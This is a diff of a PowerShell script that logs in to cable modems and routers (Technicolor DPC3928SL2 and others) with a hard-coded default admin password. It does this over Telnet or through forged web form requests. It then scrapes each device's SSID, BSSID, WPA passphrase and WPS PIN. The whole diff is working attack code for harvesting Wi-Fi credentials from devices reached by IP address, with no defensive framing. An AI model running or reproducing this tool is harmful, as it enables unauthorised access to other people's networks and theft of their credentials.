@@ -120,6 +120,15 @@ function wan($ip){
 	Write-Output "$ip - Wan" 
 	Get-Telnet -RemoteHost "$ip" -Commands " ","admin","Uq-4GIt3M","cd wifi","show nvram" 
    	verifyFile
+	if([System.IO.File]::Exists($save)){
+		$wan = Get-Content $save
+		$SSID = ($wan -match 'wl0_ssid=.*').replace('wl0_ssid=','')
+		$BSSID = ($wan -match 'macaddr=.*').replace('macaddr=','').ToUpper()
+		$PASS = ($wan -match 'wl0_wpa_psk=.*').replace('wl0_wpa_psk=','')
+		$PIN = ($wan -match 'wps_device_pin=.*').replace('wps_device_pin=','')
+		"$SSID - $BSSID - $PASS"
+	}
+	
 }
 
 # Motorola con DOCSIS 2.0
@@ -178,14 +187,15 @@ function techDPC3928SL2($ip){
 	Write-Output "$ip - Technicolor DPC3928SL2" 
     Invoke-WebRequest -Uri "http://$ip/goform/Docsis_system" -Method "POST" -Headers @{"Cache-Control"="max-age=0"; "Origin"="http://$ip"; "Upgrade-Insecure-Requests"="1"; "DNT"="1"; "User-Agent"="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"; "Accept"="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"; "Referer"="http://$ip/logout.htm"; "Accept-Encoding"="gzip, deflate"; "Accept-Language"="es-CO,es-AR;q=0.9,es-419;q=0.8,es;q=0.7,fr;q=0.6"} -ContentType "application/x-www-form-urlencoded" -Body "username_login=admin&password_login=Uq-4GIt3M&Language_English=1&login=Log+In&todo=&this_file=Docsis_system.htm&next_file=Docsis_system.htm&message=%40msg_text%23" | out-null
 	$content = (Invoke-WebRequest -Uri "http://$ip/WRadioSettings.asp" -Headers @{"Upgrade-Insecure-Requests"="1"; "DNT"="1"; "User-Agent"="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"; "Accept"="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"; "Referer"="http://$ip/WPS.asp"; "Accept-Encoding"="gzip, deflate"; "Accept-Language"="es-CO,es-AR;q=0.9,es-419;q=0.8,es;q=0.7,fr;q=0.6"}).Content
-
+	$content | Out-File $save
+	verifyFile
 	if($content -match '([0-9A-Fa-f]{2}[:]){5}([0-9A-Fa-f]{2})'){
 		$BSSID = $Matches[0]
 		if($content -match 'name="wl_ssid0" value=".*"'){
 			$SSID = ($Matches[0]).replace('name="wl_ssid0" value=','').split('"')[1]
 			if((Invoke-WebRequest -Uri "http://$ip/WSecurity.asp" -Headers @{"Upgrade-Insecure-Requests"="1"; "User-Agent"="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"; "DNT"="1"; "Accept"="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"; "Accept-Encoding"="gzip, deflate"; "Accept-Language"="es-CO,es-AR;q=0.9,es-419;q=0.8,es;q=0.7,fr;q=0.6"}).Content -match 'size="25" maxlength="64" value=".*'){
-				$pass = $Matches[0].replace('size="25" maxlength="64" value="','').split('"')[0]
-				"$BSSID - $SSID - $pass"  | Out-File $save
+				$PASS = $Matches[0].replace('size="25" maxlength="64" value="','').split('"')[0]
+				"$BSSID - $SSID - $PASS"
 			}
 		}
 	}	
